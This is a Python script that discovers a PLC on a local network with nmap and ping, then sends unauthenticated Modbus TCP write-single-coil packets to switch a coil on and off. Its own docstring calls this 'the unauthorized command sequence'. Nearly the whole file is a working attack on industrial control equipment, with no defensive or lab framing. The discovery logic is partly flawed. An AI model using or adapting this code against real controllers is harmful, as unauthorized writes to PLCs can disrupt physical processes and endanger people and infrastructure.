import socket
import struct
import time
import logging
import subprocess
import re

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ---- Configuration ----
# Default PLC IP.  If auto-discovery fails, this will be used.  Consider using 127.0.0.1 for testing in a simulated environment.
DEFAULT_PLC_IP = "192.168.1.100"  #Replace this with a real PLC address or loopback for testing

# PLC Port (typically Modbus TCP is 502)
PLC_PORT = 502

# Modbus Function Code for Write Single Coil (0x05)
WRITE_SINGLE_COIL = 0x05

# Coil Address to manipulate (Adjust based on your PLC configuration).  This is just an example.
COIL_ADDRESS = 0  # The first coil in many PLC implementations.

# Values to write to the coil.  0x0000 is OFF, 0xFF00 is ON.
COIL_ON = 0xFF00
COIL_OFF = 0x0000

# Transaction Identifier (incremented with each request)
TRANSACTION_ID = 0

# Protocol Identifier (Modbus TCP = 0)
PROTOCOL_ID = 0

# Unit Identifier (Slave Address - often 1, but depends on PLC config)
UNIT_ID = 1

# ---- IP Discovery Function ----
def discover_plc_ip():
    """Attempts to find the PLC's IP address using nmap.

    Returns:
        str: The PLC's IP address if found, otherwise None.
    """
    try:
        # Run nmap to discover devices on the network
        nmap_process = subprocess.Popen(['nmap', '-sn', '192.168.1.0/24'],  # Adjust network range as needed
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = nmap_process.communicate()

        if stderr:
            logging.warning(f"nmap error: {stderr.decode()}")

        # Parse nmap output to find potential PLC IPs (assuming the PLC hostname contains "PLC" or "controller")
        output = stdout.decode()
        ip_addresses = re.findall(r'Nmap scan report for ([\d.]+)', output)
        for ip in ip_addresses:
            #Try to resolve hostname using ping to see if contains PLC or controller.
            ping_process = subprocess.Popen(['ping','-n', '1', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            ping_stdout, ping_stderr = ping_process.communicate()
            ping_output = ping_stdout.decode()
            if "PLC" in ping_output or "controller" in ping_output.lower():
                logging.info(f"Discovered PLC IP: {ip}")
                return ip

        logging.info("No device identified as PLC found during network scan.")
        return None  # No PLC-like device found.

    except FileNotFoundError:
        logging.error("nmap is not installed.  Please install nmap to use IP discovery.")
        return None
    except Exception as e:
        logging.error(f"Error during IP discovery: {e}")
        return None



def create_modbus_packet(coil_address, value):
    """Creates a Modbus TCP packet to write a single coil.

    Args:
        coil_address (int): The address of the coil to write.
        value (int): The value to write to the coil (COIL_ON or COIL_OFF).

    Returns:
        bytes: The Modbus TCP packet.
    """
    global TRANSACTION_ID
    TRANSACTION_ID += 1  # Increment transaction ID for each request
    packet = struct.pack(
        ">HHHBBHH",  # Big-endian format
        TRANSACTION_ID,  # Transaction Identifier
        PROTOCOL_ID,  # Protocol Identifier
        6,  # Length (bytes after this field - 6 bytes for the payload)
        UNIT_ID,  # Unit Identifier (Slave Address)
        WRITE_SINGLE_COIL,  # Function Code
        coil_address,  # Address of the coil
        value  # Value to write (0xFF00 for ON, 0x0000 for OFF)
    )
    return packet


def send_modbus_command(plc_ip, plc_port, packet):
    """Sends the Modbus TCP packet to the PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
        plc_port (int): The port number of the PLC.
        packet (bytes): The Modbus TCP packet to send.

    Returns:
        bool: True if the command was sent successfully, False otherwise.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(5)  # Set a timeout to prevent indefinite blocking
            sock.connect((plc_ip, plc_port))
            sock.sendall(packet)
            response = sock.recv(1024) # Buffer of 1024 is standard.
            logging.info(f"Command sent to PLC at {plc_ip}:{plc_port}. Response: {response.hex()}")
            return True
    except socket.timeout:
        logging.error(f"Timeout occurred while connecting to PLC at {plc_ip}:{plc_port}.")
        return False
    except ConnectionRefusedError:
        logging.error(f"Connection refused by PLC at {plc_ip}:{plc_port}.  Is the PLC running and listening on port {plc_port}?")
        return False
    except Exception as e:
        logging.error(f"Error sending command to PLC at {plc_ip}:{plc_port}: {e}")
        return False



def main():
    """Main function to execute the unauthorized command sequence."""

    plc_ip = discover_plc_ip()
    if plc_ip is None:
        logging.warning("PLC IP discovery failed. Using default IP.")
        plc_ip = DEFAULT_PLC_IP

    logging.info(f"Using PLC IP: {plc_ip}")


    # 1. Turn the coil ON
    logging.info("Turning coil ON...")
    on_packet = create_modbus_packet(COIL_ADDRESS, COIL_ON)
    if send_modbus_command(plc_ip, PLC_PORT, on_packet):
        logging.info("Coil ON command sent successfully.")
    else:
        logging.error("Failed to send coil ON command.")

    time.sleep(2)  # Wait a few seconds

    # 2. Turn the coil OFF
    logging.info("Turning coil OFF...")
    off_packet = create_modbus_packet(COIL_ADDRESS, COIL_OFF)
    if send_modbus_command(plc_ip, PLC_PORT, off_packet):
        logging.info("Coil OFF command sent successfully.")
    else:
        logging.error("Failed to send coil OFF command.")



if __name__ == "__main__":
    main()